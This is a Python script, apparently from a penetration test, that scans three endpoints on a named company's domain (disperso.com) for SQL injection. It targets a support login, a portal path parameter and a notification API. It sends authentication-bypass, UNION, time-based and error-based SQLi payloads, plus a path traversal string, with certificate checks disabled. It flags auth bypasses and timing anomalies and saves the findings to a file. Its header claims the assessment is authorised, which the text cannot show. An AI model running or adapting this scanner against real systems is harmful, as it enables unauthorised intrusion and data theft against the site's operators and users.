#!/usr/bin/env python3
"""
SQLi scanner — Disperso (disperso.com)
Assessment autorizado Tr4nsHack / HEXAGON
"""
import requests, json, time, sys
from datetime import datetime
urllib3_imported = False
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    urllib3_imported = True
except: pass

RESULTS = []
TIMEOUT = 12
SLEEP_THRESH = 4.0  # segundos — si respuesta tarda más = posible time-based

def ts():
    return datetime.utcnow().strftime("%H:%M:%S")

def log(msg):
    print(f"[{ts()}] {msg}", flush=True)

def req(method, url, **kwargs):
    kwargs.setdefault("timeout", TIMEOUT)
    kwargs.setdefault("verify", False)
    kwargs.setdefault("allow_redirects", True)
    try:
        t0 = time.time()
        r = requests.request(method, url, **kwargs)
        elapsed = time.time() - t0
        return r, elapsed
    except requests.exceptions.Timeout:
        return None, TIMEOUT + 1
    except Exception as e:
        return None, -1

def record(endpoint, payload_field, payload, status, elapsed, size, body_snippet, finding):
    entry = {
        "endpoint": endpoint,
        "payload_field": payload_field,
        "payload": payload,
        "status": status,
        "elapsed": round(elapsed, 3),
        "size": size,
        "body_snippet": body_snippet[:300] if body_snippet else "",
        "finding": finding,
        "ts": ts()
    }
    RESULTS.append(entry)
    if finding != "clean":
        print(f"  *** FINDING [{finding}] field={payload_field} payload={repr(payload)[:60]}", flush=True)
    return entry

# ═══════════════════════════════════════════════════════════════
# 1. BASELINE — soporte login normal
# ═══════════════════════════════════════════════════════════════
SOPORTE_LOGIN = "https://soporte.disperso.com/api/auth/login"
SOPORTE_PORTAL = "https://soporte.disperso.com/api/public/portal/{slug}"
NOTIF_API = "https://api.disperso.com/api/v1/notification"

log("=== FASE 1: Baseline soporte login ===")
r_base, t_base = req("POST", SOPORTE_LOGIN,
    json={"email": "baseline@test.com", "password": "baseline123"},
    headers={"Content-Type": "application/json"})
if r_base:
    base_status = r_base.status_code
    base_size = len(r_base.content)
    base_body = r_base.text[:200]
    log(f"  Baseline: status={base_status} size={base_size} time={t_base:.2f}s")
    log(f"  Body: {base_body[:100]}")
else:
    base_status, base_size, base_body = 0, 0, ""
    log("  Baseline: no response")

# ═══════════════════════════════════════════════════════════════
# 2. SQLi en soporte login — email field
# ═══════════════════════════════════════════════════════════════
log("\n=== FASE 2: SQLi en soporte login — campo email ===")

sqli_emails = [
    "admin'--",
    "admin'#",
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin' OR 1=1--",
    "' OR '1'='1",
    "' OR 1=1--",
    "')",
    "admin' AND 1=1--",
    "admin' AND 1=2--",
    '" OR "1"="1',
    'admin"--',
    "admin' UNION SELECT NULL--",
    "admin' UNION SELECT 1,2,3--",
    "admin' UNION SELECT NULL,NULL--",
    # Time-based MySQL
    "admin' AND SLEEP(5)--",
    "admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    # Time-based MSSQL
    "admin'; WAITFOR DELAY '0:0:5'--",
    # Time-based PostgreSQL
    "admin' AND pg_sleep(5)--",
    # Oracle
    "admin' AND 1=1 FROM DUAL--",
    # Error-based
    "admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "admin' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]
sqli_passwords = ["' OR '1'='1", "anything", "' OR 1=1--"]

for email in sqli_emails:
    for pw in sqli_passwords[:1]:  # solo 1 password por email para no explotar
        r, elapsed = req("POST", SOPORTE_LOGIN,
            json={"email": email, "password": pw},
            headers={"Content-Type": "application/json"})
        if r is None:
            # timeout — posible time-based
            finding = "TIME_BASED_POSSIBLE" if elapsed >= SLEEP_THRESH else "timeout"
            record(SOPORTE_LOGIN, "email", email, 0, elapsed, 0, "", finding)
            log(f"  email={repr(email)[:50]} → TIMEOUT ({elapsed:.1f}s) [{finding}]")
            continue
        
        status = r.status_code
        size = len(r.content)
        body = r.text[:200]
        
        # Detección
        finding = "clean"
        size_diff = abs(size - base_size)
        
        if elapsed >= SLEEP_THRESH:
            finding = "TIME_BASED_POSSIBLE"
        elif status == 500:
            finding = "ERROR_500"
        elif status == 200 and base_status != 200:
            finding = "AUTH_BYPASS_200"
        elif any(kw in body.lower() for kw in ["sql", "syntax", "ora-", "mysql", "postgresql", "sqlite", "odbc", "sqlstate", "error in your sql", "unclosed quotation", "warning: pg_"]):
            finding = "ERROR_BASED_SQLI"
        elif size_diff > 100 and status != base_status:
            finding = "SIZE_DIFF_NOTABLE"
        
        record(SOPORTE_LOGIN, "email", email, status, elapsed, size, body, finding)
        
        marker = "***" if finding != "clean" else "   "
        log(f"{marker} email={repr(email)[:50]} status={status} size={size} t={elapsed:.2f}s [{finding}]")
        time.sleep(0.3)

# ═══════════════════════════════════════════════════════════════
# 3. SQLi en portal slug (path param)
# ═══════════════════════════════════════════════════════════════
log("\n=== FASE 3: SQLi en portal slug ===")

# Primero baseline con slug normal
r_slug_base, t_slug = req("GET", SOPORTE_PORTAL.format(slug="test"))
slug_base_status = r_slug_base.status_code if r_slug_base else 0
slug_base_size = len(r_slug_base.content) if r_slug_base else 0
log(f"  Slug baseline: status={slug_base_status} size={slug_base_size}")

# Slug existente (probar unos comunes)
for existing in ["disperso", "admin", "support", "soporte", "demo"]:
    r, elapsed = req("GET", SOPORTE_PORTAL.format(slug=existing))
    if r and r.status_code == 200:
        log(f"  SLUG EXISTENTE: {existing} → {r.status_code} size={len(r.content)}")

slugs_sqli = [
    "'",
    "'--",
    "' OR '1'='1",
    "1' OR '1'='1",
    "1 UNION SELECT 1,2,3--",
    "1' UNION SELECT NULL--",
    "1' AND SLEEP(5)--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND pg_sleep(5)--",
    "' AND 1=1--",
    "' AND 1=2--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "../admin",
    "test; SELECT 1",
    "test%27",
    "test%27%20OR%20%271%27%3D%271",
]

for slug in slugs_sqli:
    r, elapsed = req("GET", SOPORTE_PORTAL.format(slug=requests.utils.quote(slug, safe="")))
    if r is None:
        finding = "TIME_BASED_POSSIBLE" if elapsed >= SLEEP_THRESH else "timeout"
        record(SOPORTE_PORTAL, "slug", slug, 0, elapsed, 0, "", finding)
        log(f"  slug={repr(slug)[:40]} → TIMEOUT [{finding}]")
        continue
    
    status = r.status_code
    size = len(r.content)
    body = r.text[:200]
    
    finding = "clean"
    if elapsed >= SLEEP_THRESH:
        finding = "TIME_BASED_POSSIBLE"
    elif status == 500:
        finding = "ERROR_500"
    elif status not in [404, slug_base_status]:
        finding = f"STATUS_ANOMALY_{status}"
    elif any(kw in body.lower() for kw in ["sql", "syntax", "ora-", "mysql", "postgresql", "error"]):
        finding = "ERROR_BASED_SQLI"
    elif abs(size - slug_base_size) > 50 and status == slug_base_status:
        finding = "SIZE_ANOMALY"
    
    record(SOPORTE_PORTAL, "slug", slug, status, elapsed, size, body, finding)
    marker = "***" if finding != "clean" else "   "
    log(f"{marker} slug={repr(slug)[:40]} status={status} size={size} t={elapsed:.2f}s [{finding}]")
    time.sleep(0.3)

# ═══════════════════════════════════════════════════════════════
# 4. SQLi en notification endpoint (JSON fields)
# ═══════════════════════════════════════════════════════════════
log("\n=== FASE 4: SQLi en /api/v1/notification ===")

# Baseline notification
r_notif_base, t_notif = req("POST", NOTIF_API,
    json={"name": "test", "email": "test@test.com", "message": "hello"},
    headers={"Content-Type": "application/json"})
notif_base_status = r_notif_base.status_code if r_notif_base else 0
notif_base_size = len(r_notif_base.content) if r_notif_base else 0
log(f"  Notification baseline: status={notif_base_status} size={notif_base_size}")

notif_fields = ["name", "email", "phone", "company", "message", "subject", "body", "id", "userId", "clientId", "type", "data"]
sqli_value = "' OR 1=1--"
time_payloads = {
    "mysql_sleep": "' AND SLEEP(5)--",
    "mssql_waitfor": "'; WAITFOR DELAY '0:0:5'--",
    "pg_sleep": "' AND pg_sleep(5)--",
}

for field in notif_fields:
    payload_json = {"name": "test", "email": "test@test.com", "message": "hello", field: sqli_value}
    r, elapsed = req("POST", NOTIF_API,
        json=payload_json,
        headers={"Content-Type": "application/json"})
    if r is None:
        finding = "TIME_BASED_POSSIBLE" if elapsed >= SLEEP_THRESH else "timeout"
        record(NOTIF_API, f"json.{field}", sqli_value, 0, elapsed, 0, "", finding)
        log(f"  field={field} → TIMEOUT [{finding}]")
        continue
    
    status = r.status_code
    size = len(r.content)
    body = r.text[:200]
    finding = "clean"
    
    if elapsed >= SLEEP_THRESH:
        finding = "TIME_BASED_POSSIBLE"
    elif status == 500:
        finding = "ERROR_500"
    elif any(kw in body.lower() for kw in ["sql", "syntax", "ora-", "mysql", "postgresql", "error"]):
        finding = "ERROR_BASED_SQLI"
    
    record(NOTIF_API, f"json.{field}", sqli_value, status, elapsed, size, body, finding)
    marker = "***" if finding != "clean" else "   "
    log(f"{marker} field={field} status={status} size={size} t={elapsed:.2f}s [{finding}]")
    time.sleep(0.2)

# Time-based en campos más probables
for field in ["email", "name", "id", "userId"]:
    for tname, tpayload in time_payloads.items():
        payload_json = {"name": "test", "email": "test@test.com", field: tpayload}
        r, elapsed = req("POST", NOTIF_API,
            json=payload_json,
            headers={"Content-Type": "application/json"})
        status = r.status_code if r else 0
        size = len(r.content) if r else 0
        body = r.text[:200] if r else ""
        
        finding = "TIME_BASED_CONFIRMED" if elapsed >= SLEEP_THRESH else "clean"
        record(NOTIF_API, f"json.{field}[{tname}]", tpayload, status, elapsed, size, body, finding)
        
        if finding != "clean":
            log(f"  *** TIME-BASED POSSIBLE: field={field} payload={tname} t={elapsed:.2f}s")
        else:
            log(f"     time-based field={field} [{tname}] t={elapsed:.2f}s")
        time.sleep(0.3)

# ═══════════════════════════════════════════════════════════════
# 5. RESUMEN
# ═══════════════════════════════════════════════════════════════
log("\n=== RESUMEN DISPERSO ===")
findings = [r for r in RESULTS if r["finding"] not in ["clean", "timeout"]]
log(f"Total requests: {len(RESULTS)}")
log(f"Findings notables: {len(findings)}")
for f in findings:
    log(f"  [{f['finding']}] {f['endpoint']} field={f['payload_field']} payload={repr(f['payload'])[:60]} status={f['status']} t={f['elapsed']}s")

# Guardar JSON
import os
os.makedirs("disperso_recon", exist_ok=True)
with open("disperso_recon/sqli_disperso_results.json", "w") as fp:
    json.dump({"ts": ts(), "results": RESULTS, "summary": {"total": len(RESULTS), "findings": findings}}, fp, indent=2)
log("Resultados → disperso_recon/sqli_disperso_results.json")
